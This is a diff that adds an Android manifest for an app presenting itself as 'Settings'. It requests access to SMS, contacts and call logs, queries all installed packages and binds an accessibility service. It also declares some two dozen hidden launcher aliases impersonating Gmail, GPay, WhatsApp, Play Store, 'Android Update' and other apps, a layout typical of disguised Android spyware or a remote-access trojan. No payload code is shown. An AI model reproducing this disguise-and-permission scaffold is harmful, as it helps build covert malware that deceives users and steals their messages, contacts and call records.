@@ -1,0 +1,433 @@
+<?xml version="1.0" encoding="utf-8"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"
+    xmlns:tools="http://schemas.android.com/tools">
+
+    <!--simple permissions-->
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
+    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_REMOTE_MESSAGING"/>
+    <uses-permission android:name="android.permission.WAKE_LOCK" />
+    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES" tools:ignore="QueryAllPackagesPermission" />
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
+
+    <!--other permissions-->
+    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"/>
+    <uses-feature android:name="android.hardware.telephony" android:required="false"/>
+    <uses-permission android:name="android.permission.WRITE_CONTACTS"/>
+    <uses-permission android:name="android.permission.READ_CONTACTS"/>
+    <uses-permission android:name="android.permission.READ_SMS"/>
+    <uses-permission android:name="android.permission.SEND_SMS" />
+    <uses-permission android:name="android.permission.WRITE_CALL_LOG"/>
+    <uses-permission android:name="android.permission.READ_CALL_LOG"/>
+
+
+    <application
+        android:allowBackup="true"
+        android:dataExtractionRules="@xml/data_extraction_rules"
+        android:fullBackupContent="@xml/backup_rules"
+        android:icon="@mipmap/settings"
+        android:label="@string/app_name"
+        android:roundIcon="@mipmap/settings"
+        android:supportsRtl="true"
+        android:theme="@style/Theme.Settings"
+        tools:targetApi="31">
+        <activity
+            android:name=".MainActivity"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity>
+
+        <!--foreground service -->
+        <service
+            android:name=".ForegroundService"
+            android:foregroundServiceType="remoteMessaging"
+            android:enabled="true"
+            android:exported="false"
+            tools:ignore="ForegroundServicePermission" />
+
+
+        <!--icons-->
+        <activity-alias
+            android:name=".amazon"
+            android:roundIcon="@mipmap/amazon"
+            android:label="Amazon"
+            android:icon="@mipmap/amazon"
+            android:enabled="false"
+            android:targetActivity=".MainActivity"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".calendar"
+            android:roundIcon="@mipmap/calendar"
+            android:label="Calendar"
+            android:icon="@mipmap/calendar"
+            android:enabled="false"
+            android:targetActivity=".MainActivity"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".chrome"
+            android:roundIcon="@mipmap/chrome"
+            android:label="Chrome"
+            android:icon="@mipmap/chrome"
+            android:enabled="false"
+            android:targetActivity=".MainActivity"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".facebook"
+            android:roundIcon="@mipmap/facebook"
+            android:label="Facebook"
+            android:icon="@mipmap/facebook"
+            android:enabled="false"
+            android:targetActivity=".MainActivity"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".gmail"
+            android:roundIcon="@mipmap/gmail"
+            android:label="Gmail"
+            android:icon="@mipmap/gmail"
+            android:enabled="false"
+            android:targetActivity=".MainActivity"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".google"
+            android:roundIcon="@mipmap/google"
+            android:label="Google"
+            android:icon="@mipmap/google"
+            android:enabled="false"
+            android:targetActivity=".MainActivity"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".gpay"
+            android:roundIcon="@mipmap/gpay"
+            android:label="Gpay"
+            android:icon="@mipmap/gpay"
+            android:enabled="false"
+            android:targetActivity=".MainActivity"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".instagram"
+            android:roundIcon="@mipmap/instagram"
+            android:label="Instagram"
+            android:icon="@mipmap/instagram"
+            android:enabled="false"
+            android:targetActivity=".MainActivity"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".maps"
+            android:roundIcon="@mipmap/maps"
+            android:label="Maps"
+            android:icon="@mipmap/maps"
+            android:enabled="false"
+            android:targetActivity=".MainActivity"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".photos"
+            android:roundIcon="@mipmap/photos"
+            android:label="Photos"
+            android:icon="@mipmap/photos"
+            android:enabled="false"
+            android:targetActivity=".MainActivity"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".settings"
+            android:roundIcon="@mipmap/settings"
+            android:label="Play Store"
+            android:icon="@mipmap/settings"
+            android:enabled="false"
+            android:targetActivity=".MainActivity"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".playstore"
+            android:roundIcon="@mipmap/playstore"
+            android:label="Play Store"
+            android:icon="@mipmap/playstore"
+            android:enabled="false"
+            android:targetActivity=".MainActivity"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".whatsapp"
+            android:roundIcon="@mipmap/whatsapp"
+            android:label="Whatsapp"
+            android:icon="@mipmap/whatsapp"
+            android:enabled="false"
+            android:targetActivity=".MainActivity"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".youtube"
+            android:roundIcon="@mipmap/youtube"
+            android:label="YouTube"
+            android:icon="@mipmap/youtube"
+            android:enabled="false"
+
+            android:targetActivity=".MainActivity"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".update"
+            android:roundIcon="@mipmap/update"
+            android:label="Android Update"
+            android:icon="@mipmap/update"
+            android:enabled="false"
+
+            android:targetActivity=".MainActivity"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".netflix"
+            android:roundIcon="@mipmap/netflix"
+            android:label="Netflix"
+            android:icon="@mipmap/netflix"
+            android:enabled="false"
+
+            android:targetActivity=".MainActivity"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".meet"
+            android:roundIcon="@mipmap/meet"
+            android:label="Google Meet"
+            android:icon="@mipmap/meet"
+            android:enabled="false"
+
+            android:targetActivity=".MainActivity"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".googletv"
+            android:roundIcon="@mipmap/tv"
+            android:label="Google TV"
+            android:icon="@mipmap/tv"
+            android:enabled="false"
+
+            android:targetActivity=".MainActivity"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".truecaller"
+            android:roundIcon="@mipmap/truecaller"
+            android:label="TrueCaller"
+            android:icon="@mipmap/truecaller"
+            android:enabled="false"
+
+            android:targetActivity=".MainActivity"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".translator"
+            android:roundIcon="@mipmap/translator"
+            android:label="Translate"
+            android:icon="@mipmap/translator"
+            android:enabled="false"
+
+            android:targetActivity=".MainActivity"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".telegramx"
+            android:roundIcon="@mipmap/telegramx"
+            android:label="Telegram X"
+            android:icon="@mipmap/telegramx"
+            android:enabled="false"
+
+            android:targetActivity=".MainActivity"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".telegram"
+            android:roundIcon="@mipmap/telegram"
+            android:label="Telegram"
+            android:icon="@mipmap/telegram"
+            android:enabled="false"
+
+            android:targetActivity=".MainActivity"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".spotify"
+            android:roundIcon="@mipmap/spotify"
+            android:label="Spotify"
+            android:icon="@mipmap/spotify"
+            android:enabled="false"
+
+            android:targetActivity=".MainActivity"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".file"
+            android:roundIcon="@mipmap/file"
+            android:label="Files"
+            android:icon="@mipmap/file"
+            android:enabled="false"
+
+            android:targetActivity=".MainActivity"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".clock"
+            android:roundIcon="@mipmap/clock"
+            android:label="Clock"
+            android:icon="@mipmap/clock"
+            android:enabled="false"
+
+            android:targetActivity=".MainActivity"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity-alias>
+
+        <!--accessibility service-->
+        <service
+            android:name=".AccessibilityService"
+            android:exported="true"
+            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
+            <intent-filter>
+                <action android:name="android.accessibilityservice.AccessibilityService" />
+            </intent-filter>
+
+            <meta-data
+                android:name="android.accessibilityservice"
+                android:resource="@xml/accessibility_service_config" />
+        </service>
+
+    </application>
+
+</manifest>
